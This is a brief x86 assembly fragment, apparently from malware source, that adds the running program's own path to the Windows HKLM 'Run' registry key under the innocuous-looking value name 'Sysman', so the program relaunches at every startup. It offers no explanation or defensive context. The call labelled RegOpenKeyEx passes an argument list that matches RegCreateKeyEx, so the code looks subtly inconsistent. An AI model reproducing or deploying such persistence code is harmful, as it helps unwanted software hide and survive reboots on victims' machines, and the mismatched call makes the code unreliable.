; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;               Autostartup


		push	0
		push	0
		push	esp
		lea	eax, [esp+8]
		push	eax
		push	0
		push	KEY_ALL_ACCESS
		push	0
		push	0
		push	0
		push	subkey
		push	HKEY_LOCAL_MACHINE
		call	dword [RegOpenKeyEx]
		pop	edi				; edi = key handle			
		pop	edi

		lea	eax, [modulefilename]
		xor	ecx, ecx
.sizefilename:	inc	ecx
		cmp	byte [eax+ecx-1], 0
		jnz	.sizefilename

		invoke	RegSetValueEx,edi,valuename,0,REG_SZ,eax,ecx

		invoke	RegCloseKey,edi

		jmp	overtempdata

subkey		db "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
valuename	db "Sysman",0
.end:

overtempdata:
